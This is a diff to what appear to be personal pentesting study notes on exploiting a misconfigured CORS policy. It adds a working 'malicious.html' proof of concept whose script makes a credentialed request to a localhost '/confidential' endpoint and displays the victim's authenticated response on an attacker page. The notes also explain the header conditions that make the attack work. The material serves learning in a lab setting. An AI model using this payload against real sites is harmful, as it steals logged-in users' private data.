@@ -57,7 +57,22 @@ The header `Access-Control-Allow-Credentials` --> Allow to do request that conta
 Now we are going to create a file named malicious.html
 
 ````html
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('GET', 'http://127.0.0.1:5000/confidential', true);
+    req.withCredentials = true;
+    req.send();
 
+    function reqListener(){
+            document.getElementById("stolenInfo").innerHTML = req.responseText;
+        }
+
+</script>
+
+<center><h1>You have been Pwnd!!</h1></center>
+
+<p id="stolenInfo"></p>
 ````
 
 We are going to get all the source code of the website (that we can't see because we are not authenticated) an store in a variable
@@ -66,11 +81,17 @@ We are going to get all the source code of the website (that we can't see becaus
 
 `req.open .. true` --> Petition have to bee asynchronous (we wait that load all and do the petition)
 
-`req.withCredentials` --> This is because the user is authenticated and we need the session cookie
+`req.withCredentials` --> This is because the user is authenticated and we need the session cookie. We put this because we see in the response the `Access-Control-Allow-Credentials: true` header
 
 `reqListener` --> In this function we want to display all that the user is viewing
 
+The output of this is not beautiful, this is because we don't have the files like css, js, svg...
 
+To resolve this, if you see the log in python server, you can see the resources:
+
+![](../../Images/Pasted%20image%2020230905231139.png)
+
+You can recreate that, create folders with mkdir, download the files (with wget) and put them in their correspondent folder 
 
 ---
 # Labs
